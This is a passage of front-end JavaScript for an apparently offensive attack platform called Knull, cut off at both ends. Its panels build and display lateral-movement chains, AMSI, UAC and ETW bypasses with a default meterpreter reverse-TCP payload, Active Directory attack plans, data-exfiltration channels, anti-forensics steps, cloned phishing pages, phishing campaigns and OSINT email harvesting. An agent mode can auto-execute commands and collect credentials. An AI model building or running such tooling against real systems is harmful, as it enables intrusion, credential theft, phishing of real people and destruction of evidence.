     <span style="color:var(--acc)">→</span>
     <b class="mono" style="color:var(--hi)">${esc(h.to)}</b>
     <span class="sev-badge sv-high" style="font-size:10px">${esc(h.technique)}</span>
     <span class="muted" style="font-size:10px">${esc(h.mitre_id||'')}</span>
    </div>`).join('');
  } else {$('lat-chain').innerHTML=''}
  // Render movement plans
  if(!mv.length){$('lat-results').innerHTML='<div class="muted">No lateral movement paths found. Internal subnet may not be reachable from the scan container.</div>';return}
  $('lat-results').innerHTML=mv.map(m=>{
   const bt=m.best_technique||{};
   return `<div style="padding:8px 0;border-bottom:1px solid #1a0a0a">
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
     <b class="mono" style="font-size:13px;color:var(--hi)">${esc(m.target)}</b>
     <span class="sev-badge sv-high">${esc(bt.technique||'')}</span>
     <span class="muted" style="font-size:10px">${esc(bt.mitre_id||'')} · ${bt.confidence||0}% confidence</span>
    </div>
    <div class="muted" style="font-size:11px;margin-top:2px">${(m.services||[]).map(s=>s.port+'/'+s.service).join(', ')}</div>
    <details style="margin-top:4px"><summary class="muted" style="cursor:pointer;font-size:11px">📋 Commands</summary>
     <pre class="mono" style="margin:4px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:11px;overflow-x:auto;white-space:pre-wrap">${esc(bt.command||'')}</pre>
     ${(m.all_techniques||[]).filter(t=>t!==bt).map(t=>`<details style="margin:2px 0 2px 12px"><summary class="muted" style="cursor:pointer;font-size:10px">alt: ${esc(t.technique)} (${t.confidence||0}%)</summary><pre class="mono" style="margin:2px 0;padding:4px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(t.command||'')}</pre></details>`).join('')}
    </details>
   </div>`}).join('');
 })}

function autoRedTeam(){
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 if(!sid){alert('Run a scan first');return}
 $('rt-status').textContent='⏳ auto-pipeline running…';
 fetch('/api/redteam/auto',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:sid})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('rt-status').textContent='⚠ '+(j.error||'failed');return}
  $('rt-status').textContent=j.summary||'done';
  // 1. Next steps
  const steps=j.next_steps||[];
  $('rt-steps').innerHTML='<div style="font-weight:600;margin-bottom:4px">📋 Next Steps</div>'+
   steps.map(s=>`<div style="padding:2px 0;font-size:13px">${esc(s)}</div>`).join('');
  // 2. Best targets
  const targets=j.best_targets||[];
  $('rt-targets').innerHTML=targets.length?('<div style="font-weight:600;margin-bottom:4px">🎯 Best Targets</div>'+
   targets.map(t=>{
    const sc=t.rt_score||0;const pr=t.rt_priority||'';
    return `<div style="display:flex;gap:8px;align-items:center;padding:4px 0;border-bottom:1px solid #1a0a0a">
     <b class="mono" style="font-size:13px">${esc(t.host||t.target||'')}</b>
     <span class="sev-badge ${pr==='critical'?'sv-critical':pr==='high'?'sv-high':pr==='medium'?'sv-medium':'sv-low'}">${pr} · ${sc} pts</span>
     <span class="muted" style="font-size:11px">${esc(t.service||'')} ${t.port?':'+esc(String(t.port)):''}</span>
     <span class="muted" style="font-size:11px">${esc(t.cve||t.vuln||'')}</span>
    </div>`}).join('')):'';
  // 3. Kill chain
  const kc=j.kill_chain||{};
  const plans=kc.plans||[];
  $('rt-killchain').innerHTML=plans.length?('<div style="font-weight:600;margin-bottom:4px">🩸 Kill Chain ('+plans.length+')</div>'+
   plans.map(p=>{
    const w=p.weaponization||{};const lis=p.listener||{};
    return `<div style="padding:6px 0;border-bottom:1px solid #1a0a0a">
     <div><b class="mono">${esc(p.target)}</b> <span class="sev-badge sv-high">${esc(w.exploit||'N/A')}</span></div>
     <div class="muted" style="font-size:11px">payload: ${esc(w.payload||'')} · listener: ${esc(lis.lhost||'')}:${esc(String(lis.lport||''))}</div>
     <div class="muted" style="font-size:11px">sliver alt: ${esc((p.sliver||{}).format||'')} implant</div>
    </div>`}).join('')):'';
  // 4. Lateral
  const lat=j.lateral||{};
  const chain=lat.chain||[];
  $('rt-lateral').innerHTML=chain.length?('<div style="font-weight:600;margin-bottom:4px">🔗 Lateral Movement ('+lat.total_hops+' hops)</div>'+
   chain.map(h=>`<div style="padding:2px 0;font-size:12px">Hop ${h.hop}: <b class="mono">${esc(h.from)}</b> → <b class="mono" style="color:var(--hi)">${esc(h.to)}</b> <span class="sev-badge sv-high" style="font-size:10px">${esc(h.technique)}</span></div>`).join('')):'';
 })}

function arsenalSection(sec,btn){
 ['evasion','ad','exfil','advisor','supply','cloud'].forEach(s=>{$('ars-'+s).style.display=s===sec?'':'none'});
 document.querySelectorAll('#tab-arsenal .btn').forEach(b=>b.classList.remove('on'));
 if(btn)btn.classList.add('on');
}

// ---- ready-to-run actions (built from data already on disk) ----
function arsCopy(btn){
 const t=btn.dataset.cmd||'';
 if(navigator.clipboard)navigator.clipboard.writeText(t).catch(()=>{});
 const old=btn.textContent; btn.textContent='copied';
 setTimeout(()=>{btn.textContent=old},900);
}
function arsenalReady(){
 const st=$('ars-ready-status'); if(!st)return;
 st.textContent='building…';
 fetch('/api/arsenal/ready',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'})
 .then(r=>r.json()).then(j=>{
  const t=j.totals||{};
  st.textContent=(j.target||'no target')+' · prepared '+t.prepared+' · chains '+t.chains
   +' · cves '+t.cves+' · findings '+t.findings;
  const cmd=c=>`<div style="display:flex;gap:8px;align-items:flex-start;margin:3px 0">
    <code style="flex:1;min-width:0;font-size:10.5px;white-space:pre-wrap;word-break:break-all">${esc(c.cmd)}</code>
    <button class="btn" data-cmd="${esc(c.cmd)}">copy</button></div>`;
  const block=(title,rows)=>rows.length
   ?`<div style="margin:12px 0 4px;font-size:11.5px"><b>${title}</b></div>`+rows.join('')
   :'';
  let html='';
  html+=block('🎯 Knull prepared — fire from the Knull tab',
   (j.prepared||[]).map(p=>
    `<div style="font-size:11px;margin:5px 0"><b>${esc(p.technique)}</b>
      <span class="muted">on ${esc(p.target)} · ${esc(p.target_key)}</span></div>`
    +cmd({cmd:p.command})));
  html+=block('⛓ Attack chains',
   (j.chains||[]).map(c=>
    `<div style="font-size:11px;margin:6px 0"><b>[${esc(c.confidence)}]</b>
      ${(c.steps||[]).map(s=>esc(s.technique)).join(' → ')}
      <span class="muted">${((c.probability||0)*100).toFixed(1)}%</span></div>`
    +(c.steps||[]).filter(s=>s.command).map(s=>cmd({cmd:s.command})).join('')));
  html+=block('✷ CVEs',
   (j.cves||[]).map(c=>
    `<div style="font-size:11px;margin:6px 0"><b>${esc(c.cve)}</b> cvss ${c.cvss??'?'}
      <span class="muted">· ${esc(c.match)}${c.kev?' · KEV':''}</span>
      <div class="muted" style="font-size:10px">${esc(c.summary).slice(0,140)}</div></div>`
    +(c.commands||[]).map(cmd).join('')));
  html+=block('◉ Findings',
   (j.findings||[]).map(f=>
    `<div style="font-size:11px;margin:6px 0"><b>${esc(f.host)}</b>
      <span class="muted">${esc(f.finding).slice(0,90)}</span></div>`
    +(f.actions||[]).map(cmd).join('')));
  $('ars-ready-body').innerHTML=html||'<span class="muted">nothing ready — run a scan first</span>';
  $('ars-ready-body').querySelectorAll('button[data-cmd]').forEach(b=>{b.onclick=()=>arsCopy(b)});
 }).catch(e=>{st.textContent='⚠ '+e});
}

function evasionBuild(){
 const payload=$('ev-payload').value.trim()||'windows/x64/meterpreter/reverse_tcp';
 const lhost=$('ev-lhost').value.trim()||'127.0.0.1';
 const lport=$('ev-lport').value.trim()||'4444';
 const fmt=$('ev-format').value;
 const enc=$('ev-encoder').value;
 fetch('/api/arsenal/evasion',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({payload,lhost,lport,format:fmt,encoder:enc})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('ev-results').innerHTML='<div class="muted">⚠ '+(j.error||'failed')+'</div>';return}
  const pp=j.packed_payload||{};const amsi=j.amsi_bypass||[];const uac=j.uac_bypass||[];const etw=j.etw_bypass||[];const ld=j.custom_loader||{};
  $('ev-results').innerHTML=`
   <div style="font-weight:600;margin-bottom:6px">🛡️ Packed Payload</div>
   <pre class="mono" style="padding:8px;background:#0a0505;border-radius:4px;font-size:11px;overflow-x:auto">${esc(pp.command||'')}</pre>
   <div class="muted" style="font-size:11px;margin:4px 0">Encoder: ${esc(pp.encoder||'')} (${pp.encoder_rating||0}%) · Format: ${esc(pp.format||'')} · Output: ${esc(pp.output_file||'')}</div>
   ${(pp.evasion_notes||[]).map(n=>`<div style="font-size:11px;color:var(--acc)">✓ ${esc(n)}</div>`).join('')}
   <details style="margin-top:8px"><summary class="muted" style="cursor:pointer;font-size:12px">💉 AMSI Bypass (${amsi.length})</summary>
    ${amsi.map(a=>`<div style="margin:4px 0"><span class="muted" style="font-size:11px">${esc(a.technique)} (${esc(a.mitre_id)})</span><pre class="mono" style="margin:2px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(a.command)}</pre></div>`).join('')}
   </details>
   <details style="margin-top:4px"><summary class="muted" style="cursor:pointer;font-size:12px">🔓 UAC Bypass (${uac.length})</summary>
    ${uac.map(a=>`<div style="margin:4px 0"><span class="muted" style="font-size:11px">${esc(a.technique)} (${esc(a.mitre_id)})</span><pre class="mono" style="margin:2px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(a.command)}</pre></div>`).join('')}
   </details>
   <details style="margin-top:4px"><summary class="muted" style="cursor:pointer;font-size:12px">📡 ETW Bypass (${etw.length})</summary>
    ${etw.map(a=>`<div style="margin:4px 0"><span class="muted" style="font-size:11px">${esc(a.technique)}</span><pre class="mono" style="margin:2px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(a.command)}</pre></div>`).join('')}
   </details>
   <details style="margin-top:4px"><summary class="muted" style="cursor:pointer;font-size:12px">🧬 Custom ${esc(ld.language||'C#')} Loader</summary>
    <pre class="mono" style="margin:4px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(ld.template||'')}</pre>
   </details>`;
 })}
function adAttackBuild(){
 const domain=$('ad-domain').value.trim();
 const dcip=$('ad-dcip').value.trim();
 const user=$('ad-user').value.trim();
 const pass=$('ad-pass').value.trim();
 if(!domain||!dcip){alert('Enter domain and DC IP');return}
 fetch('/api/arsenal/ad',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain,dc_ip:dcip,user,password:pass})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('ad-results').innerHTML='<div class="muted">⚠ '+(j.error||'failed')+'</div>';return}
  const plan=j.plan||[];
  $('ad-results').innerHTML='<div style="font-weight:600;margin-bottom:6px">🏰 AD Attack Plan ('+plan.length+' steps)</div>'+
   plan.map((p,i)=>{
    const cmd=p.cmd||p.command||'';
    return `<div style="padding:6px 0;border-bottom:1px solid #1a0a0a">
     <div style="display:flex;gap:8px;align-items:center"><span class="sev-badge sv-high">Step ${i+1}</span><b>${esc(p.name||p.technique||p.tool||'')}</b><span class="muted" style="font-size:10px">${esc(p.risk_level||'')}</span></div>
     <div class="muted" style="font-size:11px;margin:2px 0">${esc(p.description||p.desc||'')}</div>
     <pre class="mono" style="margin:2px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(cmd)}</pre>
    </div>`}).join('');
 })}
function exfilBuild(){
 const typ=$('exfil-type').value;
 fetch('/api/arsenal/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:typ})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('exfil-results').innerHTML='<div class="muted">⚠ '+(j.error||'failed')+'</div>';return}
  const channels=j.channels||[];
  const forensics=j.forensics||[];
  $('exfil-results').innerHTML=
   '<div style="font-weight:600;margin-bottom:6px">📦 Exfil Channels ('+channels.length+')</div>'+
   channels.map(c=>{
    const sc=c.stealth||'';const rc=c.risk_level||'';
    return `<div style="padding:6px 0;border-bottom:1px solid #1a0a0a">
     <div style="display:flex;gap:8px;align-items:center"><b>${esc(c.name||'')}</b><span class="sev-badge sv-medium">${esc(c.protocol||'')}</span><span class="muted" style="font-size:10px">stealth: ${esc(sc)} · risk: ${esc(rc)}</span></div>
     <div class="muted" style="font-size:11px;margin:2px 0">${esc(c.description||'')}</div>
     <pre class="mono" style="margin:2px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(c.command||'')}</pre>
    </div>`}).join('')+
   '<div style="font-weight:600;margin:10px 0 6px">🫥 Anti-Forensics ('+forensics.length+')</div>'+
   forensics.map(f=>{
    const rl=f.risk_level||'';
    return `<div style="padding:6px 0;border-bottom:1px solid #1a0a0a">
     <div style="display:flex;gap:8px;align-items:center"><b>${esc(f.name||'')}</b><span class="sev-badge ${rl==='dangerous'||rl==='critical'?'sv-critical':'sv-medium'}">${esc(rl)}</span><span class="muted" style="font-size:10px">${f.reversible?'reversible':'NOT reversible'}</span></div>
     <div class="muted" style="font-size:11px;margin:2px 0">${esc(f.description||'')}</div>
     <pre class="mono" style="margin:2px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(f.command||'')}</pre>
    </div>`}).join('');
 })}

function advisorBuild(){
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 if(!sid){alert('Run a scan first');return}
 $('adv-status').textContent='🧠 analyzing attack surface…';
 fetch('/api/advisor/recommend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:sid})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('adv-status').textContent='⚠ '+(j.error||'failed');return}
  const st=j.stats||{};
  $('adv-status').textContent=j.summary||'done';
  $('adv-summary').innerHTML='<div style="font-weight:600;margin-bottom:4px">🧠 Advisor Summary</div>'+
   '<div style="font-size:12px">'+esc(j.summary||'')+'</div>'+
   '<div class="muted" style="font-size:11px;margin-top:4px">'+st.targets_analyzed+' targets · '+st.techniques_available+' techniques · '+st.high_confidence+' high-confidence · '+st.medium_confidence+' medium-confidence</div>';
  const paths=j.execution_order||[];
  $('adv-paths').innerHTML=paths.length?('<div style="font-weight:600;margin-bottom:6px">⚔ Recommended Attack Paths ('+paths.length+')</div>'+
   paths.map(p=>{
    const sc=p.score||0;
    const col=sc>=50?'var(--crit)':sc>=30?'var(--hi)':'var(--warn)';
    return `<div style="padding:8px 0;border-bottom:1px solid #1a0a0a">
     <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <span class="sev-badge ${sc>=50?'sv-critical':sc>=30?'sv-high':'sv-medium'}">#${p.order}</span>
      <b>${esc(p.technique)}</b>
      <span class="mono" style="font-size:12px;color:${col}">${sc} pts</span>
      <span class="muted" style="font-size:10px">${esc(p.mitre_id||'')}</span>
      <span class="muted" style="font-size:10px">prob: ${(p.probability*100).toFixed(0)}% · impact: ${p.impact}/10</span>
     </div>
     <div class="muted" style="font-size:11px;margin-top:2px">Target: <b class="mono">${esc(p.target)}</b> · Tool: ${esc(p.tool||'')}</div>
     <div style="font-size:11px;color:${col};margin-top:2px">${esc(p.recommendation||'')}</div>
     ${p.command?`<pre class="mono" style="margin:4px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(p.command)}</pre>`:''}
    </div>`}).join('')):'<div class="muted">No meaningful attack paths found. Run a deeper scan.</div>';
 })}

function phishSection(sec,btn){
 ['mirror','campaign','osint'].forEach(s=>{$('ph-'+s).style.display=s===sec?'':'none'});
 document.querySelectorAll('#tab-phish .btn').forEach(b=>b.classList.remove('on'));
 if(btn)btn.classList.add('on');
}
function phishMirror(){
 const dom=$('ph-domain').value.trim();
 const org=$('ph-org').value.trim();
 const tpl=$('ph-template').value;
 if(!dom){alert('Enter target domain');return}
 $('ph-mirror-status').textContent='⏳ generating mirror page…';
 fetch('/api/phish/mirror',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:dom,org_name:org,template:tpl})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('ph-mirror-status').textContent='⚠ '+(j.error||'failed');return}
  $('ph-mirror-status').textContent='mirror generated: '+j.size+' bytes';
  $('ph-mirror-results').innerHTML=
   `<div style="font-weight:600;margin-bottom:4px">🪞 Mirror Page: ${esc(j.template)} — ${esc(j.org_name)}</div>`+
   `<div class="muted" style="font-size:11px;margin-bottom:6px">Size: ${j.size} bytes · Callback: ${esc(j.callback)}</div>`+
   `<pre class="mono" style="padding:8px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;max-height:300px;white-space:pre-wrap">${esc(j.html)}</pre>`;
 })}
function phishCampaign(){
 const dom=$('ph-camp-domain').value.trim();
 const name=$('ph-camp-name').value.trim()||'Campaign';
 const tpl=$('ph-camp-template').value;
 if(!dom){alert('Enter target domain');return}
 $('ph-camp-status').textContent='⏳ building phishing campaign…';
 fetch('/api/phish/campaign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:dom,campaign_name:name,template:tpl})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('ph-camp-status').textContent='⚠ '+(j.error||'failed');return}
  $('ph-camp-status').textContent=j.summary||'campaign built';
  const emails=j.target_emails||[];
  const sample=j.campaign_emails_sample||[];
  $('ph-camp-results').innerHTML=
   `<div style="font-weight:600;margin-bottom:4px">📧 Campaign: ${esc(j.campaign_name)}</div>`+
   `<div class="muted" style="font-size:11px;margin-bottom:6px">Template: ${esc(j.template)} · Targets: ${emails.length} · Emails generated: ${j.campaign_emails_count}</div>`+
   `<div style="margin-bottom:6px"><b>Target Emails:</b> ${emails.map(e=>`<span class="sev-badge sv-medium" style="margin:2px">${esc(e)}</span>`).join('')}</div>`+
   sample.map(e=>`<details style="margin:4px 0"><summary class="muted" style="cursor:pointer;font-size:11px">📧 ${esc(e.subject)} → ${esc(e.to)}</summary>`+
   `<pre class="mono" style="margin:4px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:10px;overflow-x:auto;white-space:pre-wrap">${esc(e.html_body)}</pre></details>`).join('');
 })}
function phishOSINT(){
 const dom=$('ph-osint-domain').value.trim();
 const name=$('ph-osint-name').value.trim();
 const user=$('ph-osint-user').value.trim();
 if(!dom&&!name&&!user){alert('Enter at least one target');return}
 $('ph-osint-status').textContent='⏳ collecting OSINT…';
 fetch('/api/phish/osint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:dom,person_name:name,username:user})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('ph-osint-status').textContent='⚠ '+(j.error||'failed');return}
  $('ph-osint-status').textContent=j.summary||'OSINT collected';
  const pivot=j.username_pivot||[];
  const found=pivot.filter(p=>p.found);
  const emails=j.email_harvest||[];
  const ps=j.people_search||{};
  const risk=ps.risk_assessment||{};
  $('ph-osint-results').innerHTML=
   (found.length?`<div style="font-weight:600;margin-bottom:4px">👤 Username found on ${found.length} platform(s)</div>`+
    found.map(p=>`<div style="padding:2px 0;font-size:12px">✅ <a href="${esc(p.url)}" target="_blank" style="color:var(--acc)">${esc(p.platform)}</a></div>`).join(''):'')+
   (emails.length?`<div style="font-weight:600;margin:8px 0 4px">📧 Email Candidates (${emails.length})</div>`+
    emails.slice(0,10).map(e=>`<div style="padding:2px 0;font-size:12px"><span class="mono">${esc(e.email)}</span> <span class="muted" style="font-size:10px">(conf: ${e.confidence}, ${esc(e.source)})</span></div>`).join(''):'')+
   (Object.keys(risk).length?`<div style="font-weight:600;margin:8px 0 4px">⚠️ Risk Assessment</div>`+
    `<div style="font-size:12px">Digital footprint: ${risk.digital_footprint_size||0}</div>`+
    `<div style="font-size:12px">Phishing susceptibility: <b style="color:${risk.phishing_susceptibility==='high'?'var(--crit)':risk.phishing_susceptibility==='medium'?'var(--hi)':'var(--acc)'}">${esc(risk.phishing_susceptibility||'unknown')}</b></div>`+
    `<div class="muted" style="font-size:11px;margin-top:2px">${esc(risk.recommendation||'')}</div>`:'');
 })}

let agentRunning=false, agentPollTimer=null, agentPrepared=[];
function agentStart(){
 const sid=$('agent-scan').value;
 if(!sid){alert('Select a scan first');return}
 const auto=$('agent-auto').checked;
 $('agent-start-btn').style.display='none';
 $('agent-stop-btn').style.display='';
 agentRunning=true;
 $('agent-status').textContent='🤖 agent launching…';
 fetch('/api/agent/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:parseInt(sid),auto_execute:auto,max_iterations:10})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('agent-status').textContent='⚠ '+(j.error||'failed');$('agent-start-btn').style.display='';$('agent-stop-btn').style.display='none';agentRunning=false;return}
  $('agent-status').textContent='🤖 agent started — '+j.agent_id;
  agentPollTimer=setInterval(agentPoll,2000);
  agentPoll();
 })}
function agentStop(){
 agentRunning=false;
 if(agentPollTimer)clearInterval(agentPollTimer);
 fetch('/api/agent/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})})
 .then(r=>r.json()).then(j=>{
  $('agent-status').textContent='⏹ agent stopped';
  $('agent-start-btn').style.display='';
  $('agent-stop-btn').style.display='none';
  agentRender(j.status||{});
 })}
function agentPoll(){
 if(!agentRunning)return;
 fetch('/api/agent/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok)return;
  const st=j.status||{};
  $('agent-status').textContent='🤖 '+st.state+' | iter '+st.iteration+'/'+st.max_iterations+' | creds: '+st.credentials_found;
  if(!st.running){agentRunning=false;if(agentPollTimer)clearInterval(agentPollTimer);$('agent-start-btn').style.display='';$('agent-stop-btn').style.display='none'}
  agentRender(st);
 })}
function agentRender(st){
 const kc=st.kill_chain||{};
 const phases=['initial_access','execution','credential_access','privilege_escalation','persistence','lateral_movement','collection'];
 const labels={initial_access:'🎯 Initial Access',execution:'⚡ Execution',credential_access:'🔑 Credential Access',privilege_escalation:'👑 Privesc',persistence:'📌 Persistence',lateral_movement:'🔗 Lateral',collection:'📦 Collection'};
 const icons={pending:'⬜',running:'⏳',success:'✅',failed:'❌',skipped:'⏭'};
 $('agent-killchain').innerHTML='<div style="font-weight:600;margin-bottom:4px">🩸 Kill Chain Progress</div>'+
  phases.map(p=>{
   const d=kc[p]||{status:'pending'};
   return `<div style="display:flex;gap:6px;align-items:center;padding:2px 0;font-size:12px">
    <span>${icons[d.status]||'⬜'}</span><span>${labels[p]}</span>
    ${d.detail?`<span class="muted" style="font-size:10px">— ${esc(d.detail)}</span>`:''}
   </div>`}).join('');
 // ---- manual fire queue: prepared commands, the operator picks ----
 agentPrepared=st.prepared||[];
 const q=$('agent-queue');
 if(!agentPrepared.length){q.style.display='none';q.innerHTML=''}
 else{
  const ready=agentPrepared.filter(p=>!p.fired).length;
  q.style.display='';
  q.innerHTML='<div style="font-weight:600;margin-bottom:4px">🎯 Prepared — you choose what to fire '+
   '<span class="muted">('+ready+' ready, '+(agentPrepared.length-ready)+' fired)</span></div>'+
   agentPrepared.map(p=>`<div style="display:flex;gap:8px;align-items:flex-start;padding:6px 0;border-top:1px solid var(--bd);font-size:11px">
    <div style="flex:1;min-width:0">
     <b>${esc(p.technique)}</b> <span class="muted">on ${esc(p.target)}</span>
     <div class="muted" style="font-family:monospace;white-space:pre-wrap;word-break:break-all;margin-top:2px">${esc(p.command).substring(0,260)}</div>
    </div>
    ${p.fired?'<span class="muted" style="white-space:nowrap">✅ fired</span>'
             :`<button class="btn" data-tk="${esc(p.target_key)}" style="white-space:nowrap">🎯 Fire</button>`}
    <span style="white-space:nowrap;display:flex;gap:3px">
     <button class="btn" data-rec="success" data-tech="${esc(p.technique)}" data-tg="${esc(p.target)}" title="I ran it and it worked">✅</button>
     <button class="btn" data-rec="failure" data-tech="${esc(p.technique)}" data-tg="${esc(p.target)}" title="I ran it and it failed">❌</button>
     ${p.fired?`<button class="btn" data-imp="${esc(p.target_key)}" title="re-scan and prove the impact">📊</button>`:''}
    </span>
   </div>`).join('');
  q.querySelectorAll('button[data-tk]').forEach(b=>{b.onclick=()=>agentFire(b.dataset.tk)});
  q.querySelectorAll('button[data-rec]').forEach(b=>{b.onclick=()=>agentRecord(b.dataset.rec,b.dataset.tech,b.dataset.tg)});
  q.querySelectorAll('button[data-imp]').forEach(b=>{b.onclick=()=>agentImpactStart(b.dataset.imp)});
 }
 const events=st.events||[];
 $('agent-events').innerHTML='<div style="font-weight:600;margin-bottom:4px">📋 Decision Log ('+events.length+')</div>'+
 events.map(e=>{
  // success can be null ("no verdict yet" — dry run / offline): grey, not red
  const col=e.success===false?'var(--crit)':(e.success===true?'var(--acc)':'var(--muted)');
   const stateCol={recon:'var(--acc)',analyze:'var(--hi)',decide:'var(--warn)',execute:'var(--crit)',verify:'var(--acc)',success:'var(--acc)',failure:'var(--crit)'}[e.state]||'var(--muted)';
   return `<div style="padding:2px 0;font-size:11px;border-bottom:1px solid #1a0a0a">
    <span class="muted">[${e.timestamp}]</span>
    <span style="color:${stateCol};font-weight:600">[${esc(e.state)}]</span>
    <span style="color:${col}">${esc(e.action)}</span>
    <span class="muted">: ${esc(e.detail).substring(0,100)}</span>
   </div>`}).join('');
 $('agent-events').scrollTop=1e9;
}

function agentFire(tk){
 const p=agentPrepared.find(x=>x.target_key===tk);
 if(!p)return;
 if(!confirm('Run this command?\n\n'+p.technique+' on '+p.target+'\n\n'+p.command))return;
 document.querySelectorAll('#agent-queue button[data-tk]').forEach(b=>{
  if(b.dataset.tk===tk){b.disabled=true;b.textContent='⏳ firing…'}});
 fetch('/api/agent/fire',{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify({target_key:tk})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){alert('⚠ '+(j.error||'failed'));agentPollOnce();return}
  agentFireOutput(j);
  if(j.status)agentRender(j.status);
 }).catch(e=>{alert('⚠ '+e);agentPollOnce()});
}
function agentFireOutput(j){
 const ok=j.verified===true, bad=j.verified===false;
 const col=ok?'var(--acc)':(bad?'var(--crit)':'var(--muted)');
 const verdict=ok?'YES':(bad?'NO':'no verdict (dry run / unparsed)');
 const body=(j.output||j.error||'(no output)').trim()||'(no output)';
 $('agent-events').insertAdjacentHTML('beforeend',
  `<div style="padding:7px 0;border-top:2px solid ${col};font-size:11px">
    <b style="color:${col}">🎯 FIRED — ${esc(j.technique||'')}</b>
    <span class="muted"> · exit ${j.exit_code??'-'} · verified: ${verdict}</span>
   </div>
   <pre style="white-space:pre-wrap;word-break:break-word;font-size:10px;max-height:240px;overflow:auto;margin:4px 0 8px">${esc(body)}</pre>`);
 $('agent-events').scrollTop=1e9;
}
function agentPollOnce(){
 fetch('/api/agent/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})})
 .then(r=>r.json()).then(j=>{if(j.ok)agentRender(j.status||{})}).catch(()=>{});
}

// ---- operator records a result Knull never saw ----
function agentRecord(outcome,technique,target){
 let out='';
 if(outcome==='success'){
  const p=prompt('output of the command (optional — used to harvest credentials):','');
  if(p===null)return; out=p||'';
 }else if(!confirm('record as FAILED?\n\n'+technique+' on '+target))return;
 fetch('/api/agent/record',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({technique:technique,target:target,outcome:outcome,output:out,source:'operator'})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){alert('⚠ '+(j.error||'failed'));return}
  agentLog('✅ recorded: '+technique+' → '+j.outcome);
  if(j.status)agentRender(j.status);
  agentLearn(); agentEvidence();
 }).catch(e=>alert('⚠ '+e));
}

// ---- impact proof: re-scan after a shot and diff against the baseline ----
function agentImpactStart(tk){
 const p=agentPrepared.find(x=>x.target_key===tk);
 if(!p)return;
 if(!confirm('Re-scan to prove the impact? The current scan is kept as the baseline and compared against the new one.\n\n'+p.technique+' on '+p.target+'\n\nContinue?'))return;
 const el=$('agent-impact'); el.style.display='';
 el.innerHTML='⏳ baseline captured — starting re-scan…';
 fetch('/api/impact/start',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({target_key:tk,max_subs:30})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){el.innerHTML='<span style="color:var(--crit)">⚠ '+esc(j.error||'failed')+'</span>';return}
  agentImpactRender(j.impact);
  if(j.impact&&j.impact.domain)listenSSE();
 }).catch(e=>{el.innerHTML='<span style="color:var(--crit)">⚠ '+esc(String(e))+'</span>'});
}
function agentImpactRender(imp){
 const el=$('agent-impact'); if(!el)return;
 if(!imp){el.style.display='none';return}
 el.style.display='';
 if(imp.phase==='running'){
  el.innerHTML='<div style="font-size:11px">🔄 re-scan running (baseline scan #'+imp.baseline+') — measuring impact of <b>'+esc(imp.technique||'')+'</b>…</div>';
  return}
 if(imp.phase==='error'){
  el.innerHTML='<div style="font-size:11px;color:var(--crit)">⚠ impact proof failed: '+esc(imp.error||'unknown error')+'</div>';return}
 const ok=imp.changed===true;
 const col=ok?'var(--acc)':'var(--warn)';
 const head=ok?'✅ IMPACT CONFIRMED':'⚪ no measurable change';
 const d=imp.diff||{};
 el.innerHTML='<div style="font-weight:600;font-size:12px;color:'+col+'">📊 '+head+'</div>'+
  '<div style="font-size:11px;margin-top:2px">'+esc(imp.technique||'')+' on '+esc(imp.target||'')+' — '+esc(imp.summary||'')+'</div>'+
  '<div class="muted" style="font-size:10px;margin-top:2px">scan #'+imp.baseline+' → #'+(imp.after_scan||'?')+
   ' · new findings '+((d.new_findings||[]).length)+' · new subdomains '+((d.new_subdomains||[]).length)+
   ' · risk Δ'+(d.score_delta??0)+'</div>';
}
function agentImpactFetch(){
